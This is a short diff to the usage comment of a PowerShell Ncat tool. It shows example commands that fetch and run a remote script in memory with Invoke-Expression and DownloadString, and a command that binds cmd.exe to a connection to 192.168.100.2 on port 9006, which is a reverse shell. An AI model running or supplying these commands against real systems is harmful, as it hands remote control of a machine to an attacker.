@@ -20,11 +20,11 @@ Ncat Command to be executed
 Listening on port 8080
 
 PS> Invoke-Expression(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/whitej3rry/PowerShell-Ncat/master/Invoke-Ncat.ps1')
-PS> Invoke-Ncat -ArgumentList "-l 8080 -ssl -v" 
+PS> Invoke-Ncat -ArgumentList "-l 9006 -v" 
 
 Connecting to target on port 9006
 PS> Invoke-Expression(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/whitej3rry/PowerShell-Ncat/master/Invoke-Ncat.ps1')
-PS> Invoke-Ncat -ArgumentList "192.168.100.2 9006 -ssl -e cmd.exe -v" 
+PS> Invoke-Ncat -ArgumentList "192.168.100.2 9006 -e cmd.exe -v" 
 
 #>
     [CmdletBinding()]
